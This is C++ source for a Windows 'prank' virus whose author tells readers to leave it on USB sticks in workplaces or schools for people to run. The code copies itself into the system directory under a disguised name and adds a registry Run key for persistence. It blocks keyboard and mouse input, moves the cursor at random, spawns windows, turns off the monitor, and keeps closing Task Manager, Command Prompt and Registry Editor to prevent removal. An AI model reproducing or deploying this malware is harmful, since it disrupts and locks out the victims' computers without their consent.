//This is the work of ali3n
//Feel free to edit my code for your uses
//But if you take credit for it, I WILL HUNT YOU DOWN
//So don't take credit for it, I worked hard for this
//I reccomend that youe compile this code and put the .exe file on a USB
//Then put leave this USB around your workplace or school and wait for people to plug it in and run the application



#include <iostream>
#include <windows.h>
#include <winable.h>
#include <conio.h>
#include <ctime>
#include <fstream>
using namespace std;

int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;
char Notepad[MAX_PATH]="notepad.exe";
char File[MAX_PATH]="Microsoft";
char Memed[MAX_PATH]="www.memes.com";
char Website[MAX_PATH]="http:\\www.google.com";

void SetUp();
void Run( int ID );
void Beeper(), OpenStuff(), Hibernation(), CrazyMouse();

DWORD WINAPI DestroyWindows(LPVOID);

int main()
{

cout << "Your system has just been owned" << endl;
Sleep(500);
cout << "It has been hacked" << endl;
Sleep(500);
cout << "Your system is vunerable to attacks in the future" << endl;
Sleep(500);
cout << "Contact your IT team or your network administrator" << endl;
Sleep(500);
cout << "They need to fix your system's vunerabilties" << endl;
Sleep(500);
cout << "Do not worry, this attack is not malicious, it's pourpose was only to highlight cyber security issues in your system" << endl;
Sleep(500);
cout << "But future attacks may not be ;) ;) ;)" << endl;
Sleep(500);
cout << "ali3n out" << endl;
Sleep(5000);
srand( time(0) );
random = rand()%6;
system("title :.Virus.:");
BlockInput( true );
SetUp();
BlockInput( false );
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
while(1)
{
Run( random );
Sleep(10);
}
}
void SetUp()
{
char system[MAX_PATH];
char pathtofile[MAX_PATH];
HMODULE GetModH = GetModuleHandle(NULL);
GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
GetSystemDirectory(system,sizeof(system));
strcat(system,"\\winminer.exe");
CopyFile(pathtofile,system,false);

HKEY hKey;
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Mcft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system));
RegCloseKey(hKey);

mywindow = FindWindow(NULL,":.Virus.:");
cout<<"you are done now ;)";
Sleep(1000);
ShowWindow(mywindow, false);
}

void Run( int ID )
{
if( ID == 1 )
{
BlockInput(true);
}
else if( ID == 2 )
{
Beeper();
}
else if( ID == 3 )
{
OpenStuff();
}
else if( ID == 4 )
{
Hibernation();
}
else if( ID == 5 )
{
CrazyMouse();
}
else
{
BlockInput(true);
Beeper();
OpenStuff();
CrazyMouse();
}
}

void Beeper()
{
Freq = rand()%2001;
Dur = rand()%301;
Beep( Freq, Dur );
}
void OpenStuff()
{
ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",Memed,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",File,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
}
void Hibernation()
{
Sleep(1000);
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}
void CrazyMouse()
{
X = rand()%801;
Y = rand()%601;
SetCursorPos( X, Y );
}

DWORD WINAPI DestroyWindows(LPVOID)
{
while(1)
{
TaskMgr = FindWindow(NULL,"Windows Task Manager");
CMD = FindWindow(NULL, "Command Prompt");
Regedit = FindWindow(NULL,"Registry Editor");
if( TaskMgr != NULL )
{
SetWindowText( TaskMgr, "You've been done by ali3n");
PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( CMD != NULL )
{
SetWindowText( CMD, "You've been done by ali3n");
PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( Regedit != NULL )
{
SetWindowText( Regedit, "You've been done by ali3n");
PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}

Sleep(9999);
cout<<"Go to www.ali3n.co.uk/error.html to fix this error by yourself" <<endl;
}
}
